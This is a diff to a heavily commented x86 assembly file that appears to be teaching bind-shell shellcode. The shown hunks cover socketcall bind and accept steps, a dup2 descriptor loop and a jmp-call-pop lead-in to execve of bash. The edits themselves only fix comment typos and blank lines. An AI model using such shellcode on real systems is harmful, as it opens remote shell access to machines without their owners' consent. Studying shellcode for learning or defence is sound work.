@@ -37,8 +37,8 @@ _start:
 	int 0x80		; call syscall, on success (EAX <- file descriptor)
 	
 	; 0x01 - SYS_BIND also can be called by SYS_SOCKETCALL. The first argument
-	; for SYS_BIND is (sockfd) a file descriptor two the socket, the second
-	; is an (addr) address for the sockaddr_in structure, the last one is 
+	; for SYS_BIND is (sockfd) a file descriptor to the socket, the second
+	; is an (addr) address for the sockaddr_in structure, the last one 
 	; specifies how much bytes the structure has. The sockaddr_in is defined
 	; in [4], it has three mandatory values, first the protocol family (sa_family)
 	; then we have another 16-bit value to the port number, in network byte order,
@@ -93,7 +93,6 @@ _start:
 	mov eax, 0x66		; 0x66 (SYS_SOCKETCALL) as defined in [2]
 	int 0x80		; call syscall, on success (EAX <- new file descriptor)
 
-	
 	; The SYS_dup2 receives two file descriptor as arguments, the old and new.
         ; /* Duplicate FD to FD2, closing FD2 and making it open on the same file.  */
         ; extern int dup2 (int __fd, int __fd2) __THROW;
@@ -110,7 +109,6 @@ loop:
 	pop ecx
 	dec ecx
 	jnl loop 		; when jump short if not less
-	
 	
         jmp short get_bash 	; jump short (EB), will jump to a memory address, 
                                 ; in jump short, the relative  address is 8-bit value. 
@@ -129,7 +127,6 @@ loop:
                                 ; NOT(1110 1101) = 0001 0010 + 1 = 13h
                                 ; NOT(ed) + 1 = 13h (rel8_two's_complement)
                                 ; 08049011 + 2 + 13h = 08049000 (next intruction)
-
 
 execve:
         pop esi                 	; ESI <- (memory address adquired in runtime to the first 
